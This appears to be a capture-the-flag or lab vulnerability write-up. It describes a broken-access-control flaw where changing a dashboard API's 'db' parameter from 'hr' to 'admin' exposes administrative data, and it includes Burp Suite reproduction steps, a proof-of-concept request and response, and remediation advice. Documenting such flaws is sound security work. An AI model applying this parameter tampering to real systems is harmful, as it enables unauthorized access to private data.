# Broken Access Control in `db` Parameter Allows Unauthorized Access to Administrative Data

## Summary

A **Broken Access Control** vulnerability exists in the `db` query parameter used by the dashboard endpoint.

The application fails to enforce proper server-side authorization when selecting the backend database based on the user-supplied `db` parameter.

By modifying the `db` parameter from `hr` to `admin`, an authenticated low-privileged user can access sensitive administrative data that should only be available to privileged users.

---

## Impact

An attacker can access unauthorized backend resources and retrieve sensitive administrative information without proper privileges.

Depending on the exposed databases, this issue may lead to:

- Unauthorized access to administrative records.
- Disclosure of sensitive information.
- Authorization bypass.
- Enumeration of internal resources.

---

## Steps to Reproduce

1. Authenticate as a regular user.
2. Browse to:

```http
GET /dashboard?db=hr
```

3. Observe that the dashboard retrieves its data from:

```http
GET /api/dashboard/data?db=hr
```

4. Intercept the request using Burp Suite.
5. Change:

```text
db=hr
```

to

```text
db=admin
```

6. Forward the modified request.
7. Observe that the server returns administrative data.

---

## Proof of Concept

### Request

```http
GET /api/dashboard/data?db=admin HTTP/1.1
Host: localhost:8000
Referer: http://localhost:8000/dashboard?db=hr

Cookie: laravel_session=<authenticated_user_session>
```

### Response

```json
[
  {
    "id": 1,
    "admin_flag": "NUA{fc5adc5d-6a77-49a6-8bd5-53ea473ac1cb}",
    "admin_name": "Root Admin"
  }
]
```

---

## Remediation

- Enforce server-side authorization before processing the `db` parameter.
- Validate that the authenticated user is authorized to access the requested resource.
- Reject unauthorized requests with **HTTP 403 Forbidden**.
- Avoid relying on user-controlled parameters to determine privileged backend resources.
- Apply the Principle of Least Privilege.

---

